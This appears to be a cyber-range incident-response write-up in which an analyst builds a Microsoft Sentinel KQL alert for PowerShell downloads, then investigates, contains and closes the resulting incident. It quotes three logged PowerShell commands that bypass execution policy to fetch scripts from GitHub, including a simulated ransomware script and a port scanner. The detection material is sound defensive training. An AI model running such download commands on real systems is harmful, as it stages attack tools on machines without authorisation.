# Overview
Sometimes when a bad actor has access to a system, they will attempt to download malicious payloads or tools directly from the internet to expand their control or establish persistence. This is often achieved using legitimate system utilities like PowerShell to blend in with normal activity. By leveraging commands such as Invoke-WebRequest, they can download files or scripts from an external server and immediately execute them, bypassing traditional defenses or detection mechanisms. This tactic is a hallmark of post-exploitation activity, enabling them to deploy malware, exfiltrate data, or establish communication channels with a command-and-control (C2) server. Detecting this behavior is critical to identifying and disrupting an ongoing attack.

When processes are executed/run on the local VM, logs will be forwarded to Microsoft Defender for Endpoint under the DeviceProcessEvents table. These logs are then forwarded to the Log Analytics Workspace being used by Microsoft Sentinel, our SIEM. Within Sentinel, we will define an alert to trigger when PowerShell is used to download a remote file from the internet. 

# Alert Rule
```
let TargetHostname = "ktran-vm";
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine has "Invoke-WebRequest"
| order by TimeGenerated
```

#### Analytics Rule Settings:
- Name: 
- Description: 
- Enable the Rule
- Use ChatGPT to set Mitre ATT&CK Framework Categories based on the query
- Run query every 4 hours
- Lookup data for last 24 hours (can define in query)
- Stop running query after alert is generated == Yes
Configure Entity Mappings:	
- Account |  Identifier: Name, Value: AccountName	
- Host | Identifier: HostName, Value: DeviceName
- Process | Identifier: CommandLine, Value: ProcessCommandLine

- Automatically create an Incident if the rule is triggered
- Group all alerts into a single Incident per 24 hours
- Stop running query after alert is generated (24 hours)

# Incident
The above alert was triggered, causing the creation of an incident in Microsoft Sentinel.

![incident](/images-sus/incident.png)

I assign the incident to myself and label it active.

![incident assign](/images-sus/incident-assigned.png)

Further investigation reveals 3 suspicious entities and the `ktran-vm` virtual machine.

![incident visual](/images-sus/investigate.png)

The suspicious entities involved are as follows.
- `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1`
- `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
- `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1`
Each entity is using Powershell's `Invoke-WebRequest` command to download a script from an external site (Github).

 I use the query below to see if the scripts were executed and if so how many times.
 ```
let TargetHostname = "ktran-vm"; // Replace with the name of your VM as it shows up in the logs
let ScriptNames = dynamic(["eicar.ps1", "portscan.ps1", "pwncrypt.ps1"]); // Add the name of the scripts that were downloaded
DeviceProcessEvents
| where DeviceName == TargetHostname // Comment this line out for MORE results
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
| summarize count() by AccountName, DeviceName, FileName, ProcessCommandLine
```

![execution logs](/images-sus/script-logs.png)

It looks like they were. And looks as though even the user executed the portscan script themself. After speaking with the individual, it seems they clicked on an external link and then their screen just went blank.
I sign into the VM and pass the scripts off to the malware team. They come back with a description of each one:
- portscan.ps1: Scans a specified range of IP addresses for open ports from a list of common ports and logs the results.
- eicar.ps1: Creates an EICAR file which is used to test antivirus solutions and logs the process.
- pwncrypt.ps1: Encrypts files in a selected user's desktop folder, simulating ransomware activity, and creates a ransom note with decryption instructions.

# Containment, Eradication and Recovery
The machine was isolated in MDE and an anti-malware scan was run. After the machine came back clean, we removed it from isolation.

# Post-Incident Activities
Had the user go through extra rounds of cybersecurity awareness and training and upgraded our Cyber awareness training package from KnowBe4.

Also started implementation of a policy that restricts the use of PowerShell for non-essential users.

# Closure
I filled the activity log with a summary of my findings, labeled the incident a `True Positive` and closed it.
```
Alert triggered for PowerShell Invoke-WebRequest activity on host ktran-vm, indicating remote script downloads from GitHub. Investigation confirmed three scripts (eicar.ps1, portscan.ps1, pwncrypt.ps1) were downloaded and executed using -ExecutionPolicy Bypass. User interview determined the activity began after clicking an external link. The device was isolated in MDE and a full anti-malware scan was completed with no evidence of persistence or lateral movement. Scripts were analyzed by the malware team and confirmed to simulate testing, scanning, and ransomware behavior. Preventive actions included enhanced user training and implementation of restricted PowerShell usage policies.
```

![Incident Closed](/images-sus/close.png)
